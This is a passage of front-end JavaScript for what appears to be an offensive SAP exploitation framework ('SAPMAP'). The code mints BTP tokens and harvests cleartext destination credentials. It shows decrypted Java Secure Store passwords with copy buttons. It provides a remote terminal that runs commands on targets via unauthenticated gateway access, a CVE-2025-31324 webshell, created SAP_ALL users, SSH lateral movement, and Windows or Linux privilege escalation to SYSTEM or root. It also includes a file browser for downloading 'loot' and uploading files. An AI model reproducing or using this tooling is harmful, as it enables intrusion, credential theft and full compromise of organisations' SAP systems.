          <input id="btph-cid-manual" placeholder="client_id (e.g. sb-clone…!b…|destination-xsappname!b…)" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
          <input id="btph-cs-manual" placeholder="client_secret" type="password" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
          <button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', 'manual')" style="background:#1f6feb;color:#fff;border:0;padding:6px 14px;border-radius:4px;cursor:pointer">Mint</button>
        </div>
      ` : `
        <table style="width:100%;border-collapse:collapse;font-size:11px">
          <thead>
            <tr style="background:#0d1117">
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Source</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Origin</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">UAA URL (token endpoint)</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_id</th>
              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_secret</th>
              <th></th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      `}
      <div id="btph-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:#8b949e"></div>
    </div>
  `;
  document.body.appendChild(overlay);
}

async function doMintBtpToken(sid, idx) {
  const suffix = idx === 'manual' ? 'manual' : String(idx);
  const uaa = document.getElementById(`btph-uaa-${suffix}`).value.trim();
  const cid = document.getElementById(`btph-cid-${suffix}`).value.trim();
  const cs = document.getElementById(`btph-cs-${suffix}`).value.trim();
  const result = document.getElementById('btph-result');
  result.style.color = '#c9d1d9';
  result.textContent = `Minting against ${uaa} …`;
  if (!uaa || !cid || !cs) {
    result.style.color = '#f85149';
    result.textContent = 'uaa_url, client_id and client_secret are required';
    return;
  }
  const r = await api('POST', `node/${sid}/mint_btp_token`, {
    uaa_url: uaa, client_id: cid, client_secret: cs });
  if (!r || !r.ok) {
    result.style.color = '#f85149';
    result.textContent = `Mint failed: ${(r && r.error) || 'unknown error'}`;
    return;
  }
  result.style.color = '#3fb950';
  // The mint endpoint auto-enumerates server-side and returns the
  // result inline (`r.enumerate`), so no second HTTP call needed.
  const e = r.enumerate || {};
  let line = `Token minted for region ${r.region}.`;
  if (e.error) {
    line += `  (auto-enumerate: ${e.error})`;
  } else if (typeof e.destinations === 'number') {
    line += ` ✓ ${e.destinations} destination(s) captured, `
          + `${e.cleartext_captured} cleartext, `
          + `${e.linked_to_onprem} linked.`;
  }
  result.textContent = line;
  startPolling();
}

// --- OS Terminal ---

// --- Non-blocking toast (bottom-right) ---
// Used by the Java Secure Store extraction path so results appear
// without hiding auto-plotted downstream nodes behind a full modal.
// Issue #2 (item 5) — dismiss the empty-canvas onboarding card
// permanently.  localStorage-only; nothing goes to the server.
function dismissWelcomeCard() {
  try { localStorage.setItem('sapmap.welcome.dismissed', '1'); } catch (_) {}
  const card = document.getElementById('welcome-card');
  if (card) card.style.display = 'none';
}

function showToast(html, {stickUntilClose=false, autoCloseMs=15000} = {}) {
  const stack = document.getElementById('toast-stack');
  if (!stack) return;
  const toast = document.createElement('div');
  toast.style.cssText = [
    'background:#1c2128',
    'border:1px solid #30363d',
    'border-left:4px solid #3fb950',
    'border-radius:6px',
    'padding:10px 12px',
    'box-shadow:0 6px 20px rgba(0,0,0,.5)',
    'min-width:320px',
    'max-width:440px',
    'font-size:12px',
    'color:#e6edf3',
    'pointer-events:auto',
    'opacity:0',
    'transform:translateY(8px)',
    'transition:opacity .18s ease, transform .18s ease',
  ].join(';');
  toast.innerHTML = html;
  stack.appendChild(toast);
  // Animate in
  requestAnimationFrame(() => {
    toast.style.opacity = '1';
    toast.style.transform = 'translateY(0)';
  });
  const close = () => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(8px)';
    setTimeout(() => toast.remove(), 200);
  };
  toast.querySelectorAll('[data-close]').forEach(el => {
    el.addEventListener('click', close);
  });
  if (!stickUntilClose && autoCloseMs > 0) {
    setTimeout(close, autoCloseMs);
  }
  return close;
}

function showJavaSecStoreToast(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const entries = n.java_secstore_entries || [];
  const offlineCount = entries.filter(e =>
      (e.source || '').indexOf('offline') !== -1).length;
  const configCount = entries.filter(e =>
      (e.source || '').startsWith('J2EE_CONFIGENTRY')).length;
  const fileCount = entries.filter(e =>
      e.source === 'SecStore.properties').length;
  const failed = (n.java_secstore_failed_decrypts || []).length;
  showToast(
    '<div style="display:flex;justify-content:space-between;'
      + 'align-items:center;margin-bottom:6px">'
      + '<strong style="color:#3fb950">&#128273; '
        + escHtml(sid) + ' secure store extracted</strong>'
      + '<span data-close style="cursor:pointer;color:#8b949e;'
        + 'font-size:14px;margin-left:12px" title="dismiss">&times;</span>'
    + '</div>'
    + '<div style="color:#c9d1d9;line-height:1.5">'
      + fileCount + ' file entries · '
      + configCount + ' config rows'
      + (offlineCount ? ' <span style="color:#58a6ff">('
          + offlineCount + ' via offline decrypt)</span>' : '')
      + (failed ? ' · <span style="color:#d29922">'
          + failed + ' still undecryptable</span>' : '')
    + '</div>'
    + '<div style="margin-top:8px;display:flex;gap:6px">'
      + '<button class="btn btn-primary" style="padding:3px 10px;'
        + 'font-size:11px" onclick="showJavaSecStoreModal(\''
        + escHtml(sid) + '\');this.closest(\'div\').parentElement.'
        + 'querySelector(\'[data-close]\').click()">View details</button>'
      + '<button class="btn" style="padding:3px 10px;font-size:11px"'
        + ' data-close>Dismiss</button>'
    + '</div>',
    {autoCloseMs: 12000}
  );
}

// --- Java Secure Store results modal ---
let _jssCurrentSid = '';

function showJavaSecStoreModal(sid) {
  _jssCurrentSid = sid;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  document.getElementById('jss-sid').textContent = sid;
  const entries = n.java_secstore_entries || [];
  const fe = entries.filter(e => (e.source || '') === 'SecStore.properties').length;
  const ce = entries.filter(e => (e.source || '') === 'J2EE_CONFIGENTRY').length;
  const ds = entries.filter(e => e.is_downstream).map(e => e.target_sid);
  const dsText = ds.length
      ? ' | <span style="color:#f85149">downstream: ' + Array.from(new Set(ds)).join(', ') + '</span>'
      : '';
  document.getElementById('jss-meta').innerHTML =
      'version=' + escHtml(n.java_secstore_version || '?') +
      ' | algorithm=' + escHtml((n.java_secstore_algorithm || '?').slice(0, 80)) +
      ' | file=' + fe + ' · configentry=' + ce + dsText;
  renderJssTable();
  document.getElementById('jss-modal').classList.add('visible');
}

function renderJssTable() {
  const sid = _jssCurrentSid;
  if (!sid) return;
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const entries = n.java_secstore_entries || [];
  const showPw = document.getElementById('jss-showpw').checked;
  const showNoise = document.getElementById('jss-shownoise').checked;
  const filter = (document.getElementById('jss-filter').value || '').toLowerCase();
  const tbody = document.getElementById('jss-tbody');
  const rows = [];
  const isPwField = (name) => /pass|pwd|secret|credential/i.test(name);
  let hiddenNoise = 0;
  for (const e of entries) {
    const name = e.name || '';
    const value = e.value || '';
    // Noise filter: framework-internal rows that never contain
    // user-facing secrets.  Hidden by default; user can toggle the
    // 'Show noise' checkbox to reveal.  Matches:
    //   * #~childInstance.N  — cluster framework state
    //   * #~data-source-aliases.xml  — JNDI alias descriptor
    //   * #~Secured Property*  — generic property bag entries
    //   * kind === 'undecryptable'  — rows whose VBYTES couldn't be
    //     recovered by either engine or offline path
    if (!showNoise && (
          /childinstance/i.test(name)
          || /^#~data-source-aliases\.xml$/i.test(name)
          || /^#~secured property/i.test(name)
          || (e.kind || '').toLowerCase() === 'undecryptable'
        )) {
      hiddenNoise++;
      continue;
    }
    // Build a flat "belongs to" string from dest_name / dest_user /
    // target_sid / client so the filter can match destination names
    // (e.g. 'UMEBackendConnection') that only live in those fields.
    const belongsStr = [e.dest_name || '', e.dest_user || '',
                         e.dest_host || '',
                         e.target_sid || '', e.client || '',
                         e.cid || '']
                         .filter(Boolean).join(' ').toLowerCase();
    if (filter && name.toLowerCase().indexOf(filter) === -1
               && value.toLowerCase().indexOf(filter) === -1
               && belongsStr.indexOf(filter) === -1) continue;
    let display = value;
    if (!showPw && isPwField(name)) {
      display = (value.length > 0) ? '•'.repeat(Math.min(value.length, 8)) + ' (' + value.length + 'B)' : '(empty)';
    }
    // Heuristic redact for JDBC / connection-string values that embed
    // passwords inline even when the entry name doesn't advertise it.
    if (!showPw) {
      display = display.replace(/(password\s*=)[^&;\s]+/gi, '$1***');
    }
    // Modal: cap large values at 2000 chars to keep the table scrollable.
    // The full value is always retained on node.java_secstore_entries
    // (unsliced) and reachable via the per-row "Copy" button.
    if (display.length > 2000) display = display.slice(0, 2000) + '… [+'+(value.length-2000)+' more — use Copy button]';
    const kind = e.kind || '';
    const target = e.target_sid || '';
    const source = e.source || '';
    const ds = e.is_downstream ? ' style="color:#f85149"' : '';
    // "Belongs to" column: for J2EE_CONFIGENTRY rows tied to a JCo
    // destination CID, surface dest_name + user@target_sid/client so the
    // user can tell two identically-named #~jco.client.passwd rows apart.
    let belongs = '';
    if (e.dest_name) {
      belongs = '<span style="color:#f85149">' + escHtml(e.dest_name) + '</span>';
      if (e.dest_user || target || e.dest_host) {
        belongs += ' <span style="color:#8b949e">(';
        if (e.dest_user) belongs += escHtml(e.dest_user);
        // Prefer the resolved target SID; fall back to the raw host when
        // the destination has no r3name (typical for UMEBackendConnection
        // and other SAP system destinations).
        if (target) {
          belongs += (e.dest_user ? '@' : '') + escHtml(target);
        } else if (e.dest_host) {
          belongs += (e.dest_user ? '@' : '') + escHtml(e.dest_host);
        }
        if (e.client) belongs += '/' + escHtml(e.client);
        belongs += ')</span>';
      }
    } else if (e.dest_user || e.dest_host || target) {
      // Orphan destination (no #~destination.name row found) — build a
      // user@host or user@SID/client label so the row is identifiable
      // instead of showing blank.  Typical case: UMEBackendConnection
      // and other SAP system destinations.
      const user = e.dest_user ? escHtml(e.dest_user) : '';
      const host = e.dest_host ? escHtml(e.dest_host) : '';
      const sid = target ? escHtml(target) : '';
      const client = e.client ? '/' + escHtml(e.client) : '';
      const parts = [];
      if (user) parts.push(user);
      if (host) parts.push('@' + host);
      else if (sid) parts.push('@' + sid);
      if (client) parts.push(client);
      belongs = '<span style="color:#f0883e" title="orphan destination — no #~destination.name row; labelled from jco.client.* metadata">'
              + parts.join('') + '</span>';
    } else if (target) {
      belongs = escHtml(target) + (e.client ? '/' + escHtml(e.client) : '');
    }
    rows.push(
      '<tr' + ds + ' title="cid=' + escHtml(e.cid || '-') + '">' +
        '<td style="padding:4px 8px;white-space:nowrap">' + escHtml(source) + '</td>' +
        '<td style="padding:4px 8px;white-space:nowrap">' + escHtml(kind) + '</td>' +
        '<td style="padding:4px 8px;white-space:nowrap">' +
          belongs +
        '</td>' +
        '<td style="padding:4px 8px">' + escHtml(name) + '</td>' +
        '<td style="padding:4px 8px;word-break:break-all">' + escHtml(display) + '</td>' +
        '<td style="padding:4px 8px;text-align:right">' +
          '<button class="btn" style="padding:2px 8px;font-size:10px"' +
          ' onclick=\'copyJssValue(' + JSON.stringify(name) + ')\'>Copy</button>' +
        '</td>' +
      '</tr>'
    );
  }
  if (!rows.length) {
    rows.push('<tr><td colspan="6" style="padding:12px;color:#8b949e;text-align:center">No matching entries.</td></tr>');
  }
  if (hiddenNoise > 0) {
    rows.push('<tr><td colspan="6" style="padding:6px 12px;color:#8b949e;'
              + 'text-align:center;font-style:italic;border-top:1px dashed #30363d">'
              + hiddenNoise + ' noise entries hidden '
              + '(childInstance / data-source-aliases.xml / '
              + 'Secured Property* / undecryptable) — '
              + "tick 'Show noise' above to include them</td></tr>");
  }
  tbody.innerHTML = rows.join('');
}

function copyJssValue(name) {
  const n = (mapState.nodes || {})[_jssCurrentSid];
  if (!n) return;
  const entry = (n.java_secstore_entries || []).find(e => e.name === name);
  if (!entry) return;
  navigator.clipboard.writeText(entry.value || '').then(() => {
    console.log('copied', name);
  });
}

function copyJssJson() {
  const n = (mapState.nodes || {})[_jssCurrentSid];
  if (!n) return;
  navigator.clipboard.writeText(JSON.stringify(n.java_secstore_entries, null, 2));
}

function showTerminalModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('term-sid').textContent = sid;
  // Reset window position to centered
  const twin = document.getElementById('term-window');
  twin.style.top = '50%'; twin.style.left = '50%';
  twin.style.transform = 'translate(-50%, -50%)';
  twin.style.width = '820px'; twin.style.height = '520px';
  const hasGw = n && n.gw_vulnerable;
  const hasCreated = n && (n.created_users || []).length > 0;
  const hasCve = n && n.cve_2025_31324_vulnerable;
  const hasCveShell = n && (n.cve_2025_31324_shells || []).length > 0;
  const sysTypeT = (n && n.system_type || '').toUpperCase();
  const isAbapT = sysTypeT.indexOf('ABAP') !== -1;
  const methodSel = document.getElementById('term-method');
  // Rebuild options from scratch — SXPG is ABAP-only (requires SAP_ALL
  // dialog user), so it is physically absent on pure-Java stacks.
  methodSel.innerHTML = '';
  const addT = (v, label, disabled) => {
    const o = document.createElement('option');
    o.value = v; o.textContent = label; o.disabled = !!disabled;
    methodSel.appendChild(o);
  };
  addT('gateway', 'Gateway (unauthenticated)', !hasGw);
  if (isAbapT) addT('sxpg', 'SXPG (via SAP_ALL user)', !hasCreated);
  addT('cve_31324', 'CVE-2025-31324 (Java unauth)', !hasCve);
  // SAPControl OSExecute — enabled when there's an incoming Type-G
  // destination with os_exec_verified=True.  Shell as <sid>adm via
  // the SAPControl SOAP endpoint.
  const _scConn = (mapState.connections || []).find(
    c => c && c.target_sid === sid && c.os_exec_verified === true);
  addT('sapcontrol',
       _scConn
         ? `SAPControl OSExecute (${_scConn.rfc_user}@${_scConn.source_sid}→${sid})`
         : 'SAPControl OSExecute (no verified Type-G destination)',
       !_scConn);
  // SYSTEM via Windows LPE — needs a viable Windows LPE technique
  // (EfsPotato / GodPotato / MiniPlasma) AND the operator must have
  // run Check Windows SYSTEM LPE first so the picker's per-technique
  // state is populated.
  const hasWinLpe = n && (n.efspotato_vulnerable
                            || n.godpotato_vulnerable
                            || n.miniplasma_vulnerable);
  addT('winlpe_system',
       '🔥 NT AUTHORITY\\SYSTEM (via Windows LPE)',
       !hasWinLpe);
  // root via Linux LPE — Linux mirror of winlpe_system.  Gated on
  // Copy Fail / pedit-COW / Dirty Frag being viable (operator must
  // have run Check Linux Root LPE first).  The two LPE families are
  // mutually exclusive in practice (a host is Linux OR Windows);
  // both options stay in the dropdown so the dropdown's structure
  // is OS-independent.
  const hasLinuxLpe = n && (n.copyfail_vulnerable
                              || n.dirtyfrag_vulnerable
                              || n.peditcow_vulnerable);
  addT('linuxlpe_root',
       '🔥 root (via Linux LPE)',
       !hasLinuxLpe);
  // SSH lateral movement — run commands via SSH from the source node
  const hasSsh = n && (n.ssh_access || []).length > 0;
  const sshAcc = hasSsh ? n.ssh_access[0] : null;
  addT('ssh',
       hasSsh ? `SSH (${sshAcc.username}@${sshAcc.target} via ${sshAcc.from_sid})`
              : 'SSH (no lateral access)',
       !hasSsh);
  // Default-select the highest-value method available - SYSTEM /
  // root outranks everything else; otherwise fall back to
  // CVE-2025-31324 (best non-SYSTEM Windows path) then gateway /
  // sxpg / ssh.
  methodSel.value = hasWinLpe   ? 'winlpe_system'
                  : hasLinuxLpe ? 'linuxlpe_root'
                              : (hasCve ? 'cve_31324'
                                        : (hasGw ? 'gateway'
                                                 : (isAbapT && hasCreated ? 'sxpg'
                                                   : (_scConn ? 'sapcontrol'
                                                     : (hasSsh ? 'ssh' : 'gateway')))));
  // Info text
  let info = [];
  if (hasGw) info.push('Gateway: vulnerable');
  if (hasCreated && isAbapT) info.push('SXPG: user available');
  if (hasCve) {
    info.push(hasCveShell
      ? 'CVE-2025-31324: vulnerable (shell dropped — output captured)'
      : 'CVE-2025-31324: vulnerable (no shell — run "Drop JSP Webshell" for output)');
  }
  if (hasWinLpe) {
    const technique = n.efspotato_vulnerable ? 'EfsPotato'
                       : n.godpotato_vulnerable ? 'GodPotato'
                                                 : 'MiniPlasma';
    info.push('Windows LPE: ' + technique + ' viable (SYSTEM via Win LPE menu)');
  }
  if (hasLinuxLpe) {
    const linuxTech = n.copyfail_vulnerable ? 'Copy Fail'
                       : n.peditcow_vulnerable ? 'pedit-COW'
                       : 'Dirty Frag';
    info.push('Linux LPE: ' + linuxTech + ' viable (root via Linux LPE menu)');
  }
  if (hasSsh) {
    info.push(`SSH: ${sshAcc.username}@${sshAcc.target} from ${sshAcc.from_sid}`);
  }
  document.getElementById('term-info').textContent = info.join(' | ') || 'No execution method available';
  document.getElementById('term-cmdline').value = 'whoami';
  document.getElementById('term-output').textContent = 'Ready. Type a command and press Enter or click Run.\n';
  document.getElementById('terminal-modal').classList.add('visible');
  document.getElementById('term-cmdline').focus();
}

async function termExec() {
  const sid = document.getElementById('term-sid').textContent;
  const method = document.getElementById('term-method').value;
  const cmdline = document.getElementById('term-cmdline').value.trim();
  const out = document.getElementById('term-output');
  if (!cmdline) { alert('Enter a command'); return; }

  out.textContent += `\n$ ${cmdline}\n`;
  out.textContent += '(executing...)\n';
  out.scrollTop = out.scrollHeight;

  const t0 = performance.now();
  try {
    // Send raw cmdline — backend auto-detects OS and wraps in shell
    const res = await api('POST', `node/${sid}/exec_command`, { method, cmdline });
    const elapsed = Math.round(performance.now() - t0);
    // Diagnostic header — channel + reason (when present) + elapsed
    // ms.  Without this the operator can't tell whether the call went
    // via pyrfc SXPG (gateway port), SOAP-RFC (HTTP), GW SAPXPG
    // (unauthenticated 10KBLAZE), CVE-2025-31324 (Java webshell) or
    // SSH — all of which leave very different audit traces.
    const ch = res.channel || method;
    const reason = res.channel_reason ? ` — ${res.channel_reason}` : '';
    out.textContent += `[channel: ${ch}, ${elapsed}ms${reason}]\n`;
    if (res.error) {
      out.textContent += `ERROR: ${res.error}\n`;
    } else if (res.output && res.output.length) {
      out.textContent += res.output.join('\n') + '\n';
    } else if (res.success) {
      out.textContent += '(no output, exit 0)\n';
    } else {
      out.textContent += '(no output)\n';
    }
  } catch (e) {
    out.textContent += `ERROR: ${e}\n`;
  }
  out.scrollTop = out.scrollHeight;
  document.getElementById('term-cmdline').value = '';
  document.getElementById('term-cmdline').focus();
}

// --- File Browser ---
let _fbSid = '';
let _fbCurrentPath = '/tmp';
let _fbEntries = [];
// Sort column ('name'|'size'|'mode'|'mtime') and direction (1 asc, -1 desc).
// Dirs always float to the top; the chosen column orders each group.
let _fbSortCol = 'name';
let _fbSortDir = 1;

function showFileBrowserModal(sid) {
  _fbSid = sid;
  const n = (mapState.nodes || {})[sid];
  // Pick a sensible default starting directory based on OS —
  // /tmp is meaningless on Windows and C:\Windows\Temp is meaningless
  // on Linux.  Falls back to /tmp when os_type is unknown.
  const osType = (n && n.os_type || '').toLowerCase();
  const isWin = /windows|win|nt/.test(osType);
  _fbCurrentPath = isWin ? 'C:\\Windows\\Temp' : '/tmp';
  const hasCreated = !!(n && (n.created_users || []).length > 0);
  const hasGwOnly = !!(n && n.gw_vulnerable) && !hasCreated
                     && !(n && n.cve_2025_31324_vulnerable);
  document.getElementById('fb-sid').textContent = sid;
  document.getElementById('fb-path').value = _fbCurrentPath;
  document.getElementById('fb-tbody').innerHTML = '';
  document.getElementById('fb-upload-status').textContent = '';
  // Show a subtle warning when we're on the pure-GW-SAPXPG channel —
  // populous dirs and large binaries suffer from the kernel-793 TLV
  // stdout cap that SXPG doesn't have.  Operators regularly hit
  // "no output" on /tmp / /etc and truncated downloads and think
  // it's a SAPMAP bug rather than a channel limitation.
  if (hasGwOnly) {
    document.getElementById('fb-banner').innerHTML =
      '<span style="color:#f0883e">⚠ GW SAPXPG channel only — ' +
      'listings on populous dirs (/tmp, /etc) and binary downloads ' +
      'may fail due to the kernel-793 stdout cap. ' +
      'Create a SAPMAP user (SXPG channel) to remove this limit.</span>';
  } else {
    document.getElementById('fb-banner').textContent = '';
  }
  // Drive bar: fetch and show available drives on Windows targets
  const drivesEl = document.getElementById('fb-drives');
  drivesEl.style.display = 'none';
  drivesEl.innerHTML = '';
  if (isWin) {
    _fbLoadDrives(sid);
  }
  document.getElementById('fb-status').textContent = '';
  const win = document.getElementById('fb-window');
  win.style.top = '50%'; win.style.left = '50%';
  win.style.transform = 'translate(-50%, -50%)';
  win.style.width = '900px'; win.style.height = '600px';
  document.getElementById('fb-modal').classList.add('visible');
  fbNavigate(_fbCurrentPath);
}

async function _fbLoadDrives(sid) {
  const el = document.getElementById('fb-drives');
  try {
    const res = await api('GET', 'node/' + sid + '/fs/drives');
    if (!res.ok || !res.drives || !res.drives.length) return;
    el.style.display = 'flex';
    el.innerHTML = '<span style="color:#8b949e;margin-right:2px">Drives:</span>';
    for (const d of res.drives) {
      const btn = document.createElement('button');
      btn.className = 'btn';
      btn.style.cssText = 'padding:1px 8px;font-size:11px;font-family:monospace;margin:0';
      btn.textContent = d;
      btn.onclick = function() { fbNavigate(d + '\\'); };
      el.appendChild(btn);
    }
  } catch (_) {}
}

function _fbFormatSize(bytes) {
  if (bytes === 0) return '0 B';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024*1024) return (bytes/1024).toFixed(1) + ' KB';
  if (bytes < 1024*1024*1024) return (bytes/(1024*1024)).toFixed(1) + ' MB';
  return (bytes/(1024*1024*1024)).toFixed(2) + ' GB';
}

async function fbNavigate(path) {
  // Detect Windows-style path so 'up-one-level' walks backslashes
  // instead of forward slashes.  Also drop trailing separators
  // uniformly regardless of separator style.
  const isWinPath = /^[A-Za-z]:/.test(_fbCurrentPath) || /^[A-Za-z]:/.test(path);
  const sep = isWinPath ? '\\' : '/';
  const splitRe = isWinPath ? /[\\\/]/ : /\//;
  const trimRe = isWinPath ? /[\\\/]+$/ : /\/+$/;
  if (path === '..') {
    const parts = _fbCurrentPath.replace(trimRe, '').split(splitRe);
    parts.pop();
    path = parts.join(sep) || (isWinPath ? 'C:\\' : '/');
  }
  path = path.replace(trimRe, '') || (isWinPath ? 'C:\\' : '/');
  // Normalize bare drive letter "P:" to "P:\" so the backend sees a root dir
  if (/^[A-Za-z]:$/.test(path)) { path = path + '\\'; }
  _fbCurrentPath = path;
  document.getElementById('fb-path').value = path;
  document.getElementById('fb-status').textContent = 'Loading...';
  document.getElementById('fb-tbody').innerHTML = '';
  try {
    const res = await api('POST', `node/${_fbSid}/fs/list`, { path });
    if (!res.ok) {
      document.getElementById('fb-status').textContent = 'Error: ' + (res.error || 'unknown');
      _fbEntries = [];
      return;
    }
    _fbEntries = res.entries || [];
    document.getElementById('fb-status').textContent =
      path + ' — ' + _fbEntries.length + ' entries';
    _fbRenderEntries();
  } catch (e) {
    document.getElementById('fb-status').textContent = 'Error: ' + e;
  }
}

function fbRefresh() {
  fbNavigate(_fbCurrentPath);
}

// Column click: toggle direction if same column, else switch column
// and default to ascending (name/mode/mtime) or descending (size, since
// biggest-first is usually what you want when hunting for logs to grab).
function fbSort(col) {
  if (_fbSortCol === col) {
    _fbSortDir = -_fbSortDir;
  } else {
    _fbSortCol = col;
    _fbSortDir = (col === 'size' || col === 'mtime') ? -1 : 1;
  }
  _fbRenderEntries();
}

function _fbSortEntries(entries) {
  const col = _fbSortCol;
  const dir = _fbSortDir;
  const key = (e) => {
    if (col === 'size')  return e.size || 0;
    if (col === 'mode')  return (e.mode || '').toLowerCase();
    if (col === 'mtime') return (e.mtime || '');
    return (e.name || '').toLowerCase();
  };
  const cmp = (a, b) => {
    const ka = key(a), kb = key(b);
    if (typeof ka === 'number' && typeof kb === 'number') return (ka - kb) * dir;
    if (ka < kb) return -1 * dir;
    if (ka > kb) return  1 * dir;
    return 0;
  };
  const dirs  = entries.filter(e => e.is_dir).slice().sort(cmp);
  const files = entries.filter(e => !e.is_dir).slice().sort(cmp);
  return [...dirs, ...files];
}

function _fbUpdateSortIndicators() {
  ['name','size','mode','mtime'].forEach(c => {
    const el = document.getElementById('fb-sort-' + c);
    if (el) el.textContent = (c === _fbSortCol)
                                ? (_fbSortDir > 0 ? '▲' : '▼') : '';
  });
}

function _fbRenderEntries() {
  _fbUpdateSortIndicators();
  const tbody = document.getElementById('fb-tbody');
  tbody.innerHTML = '';
  const path = _fbCurrentPath;
  const isWinPath = /^[A-Za-z]:[\\\/]/.test(path);
  const sep = isWinPath ? '\\' : '/';
  const sorted = _fbSortEntries(_fbEntries);
  for (const e of sorted) {
    const tr = document.createElement('tr');
    tr.style.cssText = 'border-bottom:1px solid #21262d;cursor:pointer';
    tr.onmouseover = function(){ this.style.background='#161b22'; };
    tr.onmouseout = function(){ this.style.background=''; };
    const icon = e.is_dir ? '📁' : '📄';
    // Prefer abs_path when the backend supplied one (single-file
    // listing case).  Otherwise if the name is already absolute
    // (some ls variants echo the full path when given a file arg),
    // use it directly.  Otherwise join with the current directory.
    let fullPath;
    if (e.abs_path) {
      fullPath = e.abs_path;
    } else if (e.name && (e.name[0] === '/'
                            || /^[A-Za-z]:[\\\/]/.test(e.name))) {
      fullPath = e.name;
    } else {
      // Trim any trailing separator on `path` (root cases: "/" and "C:\")
      // before adding our own separator.
      const base = path.replace(/[\\\/]+$/, '') || (isWinPath ? 'C:' : '');
      fullPath = base + sep + e.name;
    }
    if (e.is_dir) {
      tr.ondblclick = function(){ fbNavigate(fullPath); };
    }
    tr.innerHTML =
      '<td style="padding:4px 8px;text-align:center">' + icon + '</td>' +
      '<td style="padding:4px 8px;color:' + (e.is_dir ? '#58a6ff' : '#c9d1d9') + '">' +
        _esc(e.name) + '</td>' +
      '<td style="padding:4px 8px;text-align:right;color:#8b949e">' +
        (e.is_dir ? '' : _fbFormatSize(e.size)) + '</td>' +
      '<td style="padding:4px 8px;color:#8b949e">' + _esc(e.mode || '') + '</td>' +
      '<td style="padding:4px 8px;color:#8b949e">' + _esc(e.mtime || '') + '</td>' +
      '<td style="padding:4px 8px;text-align:center">' +
        (e.is_dir ? '' :
          '<button class="btn" style="padding:2px 8px;font-size:11px" ' +
          'onclick="event.stopPropagation();fbDownload(\'' + _esc(fullPath).replace(/\\/g, "\\\\").replace(/'/g, "\\'") + '\')">' +
          '⬇</button>') +
      '</td>';
    tbody.appendChild(tr);
  }
  if (sorted.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" style="padding:12px;color:#8b949e;text-align:center">' +
      '(empty directory)</td></tr>';
  }
}

// Polls activeTasks (refreshed by the main state loop every ~1s) until
// `taskKey` disappears — signalling the background thread finished.
// Then runs `onDone(hadError)`.  Guards with a 10-minute cap so a
// stuck task doesn't loop forever.
// `onProgress(label)` (optional) fires on every tick while the task is
// active with the current backend label (which includes progress like
// "42% (3312/7834 B)" for downloads).
function _fbWaitForTask(taskKey, onDone, onProgress) {
  const startedAt = Date.now();
  const HARD_CAP_MS = 10 * 60 * 1000;
  const seenActive = { v: false };
  const tick = () => {
    const label = activeTasks && activeTasks[taskKey];
    const stillRunning = !!label;
    if (stillRunning) {
      seenActive.v = true;
      if (onProgress) { try { onProgress(label); } catch (_) {} }
    }
    // We need to have SEEN it active at least once before deciding
    // "gone means done" — otherwise the very first poll can fire
    // before the state refresh has picked up the task and we'd
    // report completion instantly.
    if (seenActive.v && !stillRunning) {
      onDone(false);
      return;
    }
    if (Date.now() - startedAt > HARD_CAP_MS) {
      onDone(true);
      return;
    }
    setTimeout(tick, 750);
  };
  setTimeout(tick, 750);
}

// Show / hide / update the foreground progress bar in the file browser.
// The backend embeds "NN% (done/total B)" in the task label; this
// helper parses it and updates the bar without needing a second API.
function _fbShowProgress(labelText) {
  const wrap = document.getElementById('fb-progress-wrap');
  const bar = document.getElementById('fb-progress-bar');
  const pctEl = document.getElementById('fb-progress-pct');
  const lblEl = document.getElementById('fb-progress-label');
  wrap.style.display = 'block';
  const m = /(\d+)%\s*\(([\d]+)\/([\d]+)\s*B\)/.exec(labelText || '');
  if (m) {
    const pct = Math.min(100, Math.max(0, parseInt(m[1], 10)));
    bar.style.width = pct + '%';
    pctEl.textContent = pct + '%';
    lblEl.textContent = labelText;
  } else {
    // No numeric progress yet (single-shot base64 path or pre-first-chunk) —
    // show an indeterminate-style label; keep bar at 0.
    lblEl.textContent = labelText || 'Working...';
    pctEl.textContent = '';
  }
}

function _fbHideProgress() {
  document.getElementById('fb-progress-wrap').style.display = 'none';
  document.getElementById('fb-progress-bar').style.width = '0%';
}

async function fbDownload(remotePath) {
  const status = document.getElementById('fb-status');
  status.textContent = 'Downloading ' + remotePath + '...';
  _fbShowProgress('Downloading ' + remotePath + '...');
  try {
    await api('POST', `node/${_fbSid}/fs/download`, { path: remotePath });
    showToast('Download started: ' + remotePath, 'info');
    _fbWaitForTask(
      _fbSid + ':fs_download',
      function(timedOut) {
        _fbHideProgress();
        if (timedOut) {
          status.textContent = 'Download of ' + remotePath +
            ' — no completion notification after 10 min; check console';
        } else {
          status.textContent = 'Download of ' + remotePath +
            ' finished — check console for loot path';
          showToast('Downloaded: ' + remotePath, 'success');
        }
      },
      function(label) {
        _fbShowProgress(label);
      }
    );
  } catch (e) {
    _fbHideProgress();
    status.textContent = 'Download error: ' + e;
  }
}

async function fbUploadFile() {
  const input = document.getElementById('fb-upload-input');
  if (!input.files || !input.files[0]) return;
  const file = input.files[0];
  const isWinPath = /^[A-Za-z]:[\\\/]/.test(_fbCurrentPath);
  const sep = isWinPath ? '\\' : '/';
  const uploadBase = _fbCurrentPath.replace(/[\\\/]+$/, '')
                       || (isWinPath ? 'C:' : '');
  const remotePath = uploadBase + sep + file.name;
  const status = document.getElementById('fb-upload-status');
  status.textContent =
    'Uploading ' + file.name + ' (' + _fbFormatSize(file.size) + ')...';
  _fbShowProgress('Uploading ' + file.name + '...');
  const formData = new FormData();
